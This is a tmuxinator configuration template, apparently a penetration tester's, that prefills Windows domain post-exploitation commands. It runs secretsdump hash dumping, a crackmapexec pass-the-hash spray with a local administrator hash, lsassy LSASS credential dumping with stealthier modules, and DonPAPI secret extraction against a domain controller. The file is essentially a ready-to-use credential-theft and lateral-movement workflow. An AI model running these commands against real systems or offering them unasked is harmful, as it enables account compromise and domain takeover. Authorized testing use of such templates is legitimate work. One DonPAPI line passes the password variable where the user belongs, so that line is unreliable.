name: localAdmin
root: /RSM/



# Variables/Defaults are set here
<%
  @settings["prefill"] ||= "python3 /RSM/prefillTest.py"
  @settings["domain"] ||= "domain.local"
  @settings["user"] ||= "user"
  @settings["pass"] ||= "pass"
  @settings["workspace"] ||= "default"
    #this must be unique to avoid potential conflict with prior testers
  @settings["rootDir"] ||= "/RSM"
  ### example of starting project with arguments: tmuxinator start internalTemplate domain=rsmus.local user=Sally pass="s8g9h3J##"
%>

# create and cd into client/testing folder before running
windows:
  - secretsdump: 
      panes:
        - secretsdump:
          - printf '\033]2;%s\033\\' 'secretsdump'
          - <%= @settings["prefill"] %> "secretsdump.py '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'@localAdminPC"; clear
  - passTheHash: 
      panes:
        - passTheHash:
          - printf '\033]2;%s\033\\' 'passTheHash'
          - <%= @settings["prefill"] %> "crackmapexec smb <%= @settings["rootDir"] %>/scans/Lists/smb.lst --local-auth -u administrator -H hashValue --continue-on-success | tee <%= @settings["rootDir"] %>/scans/pth_spray.txt"; clear; echo -e "\e[0;31m --local-auth is necessary to avoid locking accounts out of the domain\n    - however, when computers are promoted to DC the local admin pass is used as DA pass. checking for reuse is viable (would have to remove --local-auth when testing DCs)\033[0m" 
  - lsassy: 
      panes:
        - lsassy:
          - printf '\033]2;%s\033\\' 'lsassy'; clear
          - echo "lsassy targetMachine -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -m procdump_embedded"
          - echo "lsassy targetMachine -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -m comsvcs_stealth"
          - echo "lsassy targetMachine -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -m ppldump_embedded"
          - echo "^optional modules for more covert attack methods using -m"
          - <%= @settings["prefill"] %> "lsassy targetMachine -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %>"
  - DonPAPI: 
      panes:
        - DonPAPI:
          - printf '\033]2;%s\033\\' 'DonPAPI'
          - cd /opt/nomad-tools
          - git clone https://github.com/login-securite/DonPAPI.git
          - cd DonPAPI && pipenv install
          - <%= @settings["prefill"] %> pipenv run python3 DonPAPI.py DC-NetBIOS.'<%= @settings["domain"] %>/<%= @settings["pass"] %>:<%= @settings["pass"] %>'@`cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1`; clear
